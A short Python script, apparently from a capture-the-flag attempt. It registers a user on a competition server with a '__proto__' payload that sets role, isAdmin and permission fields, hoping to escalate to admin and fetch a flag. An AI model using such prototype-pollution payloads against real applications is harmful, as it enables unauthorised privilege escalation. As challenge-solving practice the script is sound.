import requests

# Oh, the admin has `id=8` according to login.
# There is an endpoint `/api/v2/secretendpointforflag`. It returns `{"error":"Forbidden"}`!
# How to get access?
# If we have prototype pollution, we can pollute `isAdmin` or `role` or whatever is checked!
# Wait! We CAN pollute during login or registration or both?
# "Some of them are already here and aren't even hidden."

# Let's try prototype pollution to bypass the Forbidden!
url_reg = "http://exp.cybergame.sk:7021/api/v2/register"
payload = {
    "username": "admin2015",
    "password": "password",
    "__proto__": {
        "role": "admin",
        "isAdmin": True,
        "is_admin": True,
        "admin": True,
        "level": 999,
        "permissions": ["admin", "flag"]
    }
}
r_reg = requests.post(url_reg, json=payload, headers={"Content-Type": "application/json"})
token = r_reg.json().get("token")

r2 = requests.get("http://exp.cybergame.sk:7021/api/v2/secretendpointforflag", headers={"Authorization": f"Bearer {token}"})
print(r2.text)
